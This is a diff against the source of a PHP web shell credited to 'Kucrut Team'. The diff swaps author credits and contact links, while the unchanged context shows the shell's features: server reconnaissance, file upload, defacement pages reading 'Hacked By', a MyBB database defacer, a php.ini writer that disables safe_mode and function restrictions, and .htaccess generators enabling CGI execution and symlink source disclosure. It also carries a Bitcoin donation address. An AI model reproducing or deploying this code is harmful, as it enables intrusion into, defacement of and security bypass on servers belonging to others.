@@ -1,7 +1,7 @@
 <?php
 /*
 	Author: 	Solevisible/Kucrut-Team
-	Telegram: 	https://telegram.me/solevisible
+	Telegram: 	https://telegram.me/
 	YouTube: 	https://youtube.com/solevisible
 	Gmail:		solevisible@gmail.com
 	Date:		Monday, September 14, 2020
@@ -1183,7 +1183,7 @@ echo '<tr>
 <td height="16" colspan="2"><span class="header_vars">Disable Functions: </span><b>'.Kucrut_GetDisable_Function().'</b></td>
 </tr>
 <tr>
-<td height="16" colspan="2"><span class="header_vars">CURL :</span>'.$curl.' | <span class="header_vars">SSH2 : </span>'.$ssh2.' | <span class="header_vars">Magic Quotes : </span>'.$magic.' | <span class="header_vars"> MySQL :</span>'.$mysql.' | <span class="header_vars">MSSQL :</span>'.$mssql.' | <span class="header_vars"> PostgreSQL :</span>'.$pg.' | <span class="header_vars"> Oracle :</span>'.$or.' '.($GLOBALS['sys']=="unix"?'| <span class="header_vars"> CGI :</span> '.$cgi_shell:"").'</td><td width="15%"><div id="kucrut_solevisible"><center><a href="https://t.me/solevisible" target="_blank"><span><font class="solevisible-text" color="#0F0">Sole Sad & Invisible</font></span></a></center></div></td>
+<td height="16" colspan="2"><span class="header_vars">CURL :</span>'.$curl.' | <span class="header_vars">SSH2 : </span>'.$ssh2.' | <span class="header_vars">Magic Quotes : </span>'.$magic.' | <span class="header_vars"> MySQL :</span>'.$mysql.' | <span class="header_vars">MSSQL :</span>'.$mssql.' | <span class="header_vars"> PostgreSQL :</span>'.$pg.' | <span class="header_vars"> Oracle :</span>'.$or.' '.($GLOBALS['sys']=="unix"?'| <span class="header_vars"> CGI :</span> '.$cgi_shell:"").'</td><td width="15%"><div id="kucrut_solevisible"><center><a href="https://t.me/solevisible" target="_blank"><span><font class="solevisible-text" color="#0F0">Kucrut Team</font></span></a></center></div></td>
 </tr>
 <tr>
 <td height="11" colspan="3"><span class="header_vars">Open_basedir :</span><b>'.$open_b.'</b> | <span class="header_vars">Safe_mode_exec_dir :</span><b>'.$safe_exe.'</b> | <span class="header_vars"> Safe_mode_include_dir :</span></b>'.$safe_include.'</b></td>
@@ -2253,7 +2253,7 @@ echo "<table class='foot' width='100%' border='0' cellspacing='3' cellpadding='0
 <input type='hidden' name='ajax' value='true'>
 <input type='hidden' name='kucrut1' value='uploadFile'>
 <input type='hidden' name='charset' value='" . (isset($_POST['charset'])?$_POST['charset']:'') . "'>
-<span class='footer_text'>Upload file: </span><span><button id='addup' onclick='addnewup();return false;'><b>+</b></button></span><p id='pfooterup'><label class='inputfile' for='footerup'><span id='__fnameup'></span> <strong>&nbsp;&nbsp;Choose a file</strong></label><input id='footerup' class='toolsInp' type='file' name='f[]' onChange='handleup(this,0);' multiple></p><input type='submit' name='submit' value=' '></form><div id='kucrut-copyright'><span class='copyright'>[ ./KucrutTeam &copy; 2012-".date('Y')." ]</span><br><span><a href='javascript:void(0);' onclick='alert(\"BTC: 1KLty8LUqnqsXkM3Qkvy2Kpv4gLt7Ugcyo\");' style='color: #E91E63;text-decoration: none;'>Donate Us !</a></span> <span style='letter-spacing: 2px;color: #dfff00;'>solevisible[at]gmail.com</span> <span><a style='color: #ff6060;text-decoration: none;' target='_blank' href='https://telegram.me/solevisible'>@solevisible</a></span></div></td>
+<span class='footer_text'>Upload file: </span><span><button id='addup' onclick='addnewup();return false;'><b>+</b></button></span><p id='pfooterup'><label class='inputfile' for='footerup'><span id='__fnameup'></span> <strong>&nbsp;&nbsp;Choose a file</strong></label><input id='footerup' class='toolsInp' type='file' name='f[]' onChange='handleup(this,0);' multiple></p><input type='submit' name='submit' value=' '></form><div id='kucrut-copyright'><span class='copyright'>[ ./KucrutTeam &copy; 2012-".date('Y')." ]</span><br><span><a href='javascript:void(0);' onclick='alert(\"BTC: 1KLty8LUqnqsXkM3Qkvy2Kpv4gLt7Ugcyo\");' style='color: #E91E63;text-decoration: none;'>Donate Us !</a></span> <span style='letter-spacing: 2px;color: #dfff00;'>solevisible[at]gmail.com</span> <span><a style='color: #ff6060;text-decoration: none;' target='_blank' href='https://telegram.me/'>@kucrut_team</a></span></div></td>
 </tr>
 </table>
 </div>
@@ -3389,7 +3389,7 @@ $table = array('td1' =>
 );
 create_table($table);
 echo "<br><div class='txtfont'>| Your Index |</div><br>
-<textarea name=index rows='19' cols='103'><title>Hacked By Sole Sad & Invisible</title><b>Hacked By Sole Sad & Invisible</b></textarea><br>
+<textarea name=index rows='19' cols='103'><title>Hacked By Kucrut Team</title><b>Hacked By Kucrut Team</b></textarea><br>
 <input type='submit' value=' '>
 </form></center></center>";
 if(isset($_POST['kucrut6'])){
@@ -3446,7 +3446,7 @@ $table = array('td1' =>
 );
 create_table($table);
 echo "<br><div class='txtfont'>| Your Index |</div><br>
-<textarea name='index' rows='19' cols='103'><title>Hacked By Sole Sad & Invisible</title><b>Hacked By Sole Sad & Invisible</b></textarea><br>
+<textarea name='index' rows='19' cols='103'><title>Hacked By Kucrut Team</title><b>Hacked By Kucrut Team</b></textarea><br>
 <input type='submit' value=' '></form></center></center>";
 if($_POST['kucrut8']=='>>'){
 $s0levisible="Powered By Solevisible";
@@ -3490,7 +3490,7 @@ $table = array('td1' =>
 create_table($table);
 echo "<br><div class='txtfont'>| Your Index |</div><br>
 <textarea name=mybbindex rows='19' cols='103'>
-<title>Hacked By Sole Sad & Invisible</title><b>Hacked By Sole Sad & Invisible</b></textarea><p><input type='submit' value='' ></p></form></center></center>";
+<title>Hacked By Kucrut Team</title><b>Hacked By Kucrut Team</b></textarea><p><input type='submit' value='' ></p></form></center></center>";
 if(isset($_POST['kucrut6'])){
 $mybb_dbh = $_POST['kucrut6'];
 $mybb_dbu = $_POST['kucrut7'];
@@ -3635,7 +3635,7 @@ if(!empty($_POST['kucrut2']) && isset($_POST['kucrut2'])){
 echo '<center><b><big>htaccess for Apache created...!</center></b></big>';
 }
 if(!empty($_POST['kucrut1'])&& isset($_POST['kucrut1'])){
-@__write_file($GLOBALS['cwd']."php.ini","safe_mode=OFF\ndisable_functions=ByPassed By Sole Sad & Invisible(Kucrut)");
+@__write_file($GLOBALS['cwd']."php.ini","safe_mode=OFF\ndisable_functions=ByPassed By Kucrut Team(Kucrut)");
 echo '<center><b><big> php.ini created...!</center></b></big>';
 }
 if(!empty($_POST['kucrut3']) && isset($_POST['kucrut3'])){
@@ -5188,9 +5188,9 @@ function kucrutcgihtaccess($m,$d='', $symname=false){
 $readme = "";
 if($symname){$readme="\nReadmeName ".trim($symname);}
 if($m=='cgi'){
-$code = "#Coded By Sole Sad & Invisible\nOptions FollowSymLinks MultiViews Indexes ExecCGI\nAddType application/x-httpd-cgi .kucrut\nAddHandler cgi-script .kucrut";
+$code = "#Coded By Kucrut Team\nOptions FollowSymLinks MultiViews Indexes ExecCGI\nAddType application/x-httpd-cgi .kucrut\nAddHandler cgi-script .kucrut";
 }elseif($m=='sym'){
-$code = "#Coded By Sole Sad & Invisible\nOptions Indexes FollowSymLinks\nDirectoryIndex solevisible.phtm\nAddType text/plain php html php4 phtml\nAddHandler text/plain php html php4 phtml{$readme}\nOptions all";
+$code = "#Coded By Kucrut Team\nOptions Indexes FollowSymLinks\nDirectoryIndex solevisible.phtm\nAddType text/plain php html php4 phtml\nAddHandler text/plain php html php4 phtml{$readme}\nOptions all";
 }elseif($m=='shtml'){
 $code = "Options +Includes\nAddType text/html .shtml\nAddHandler server-parsed .shtml";
 }
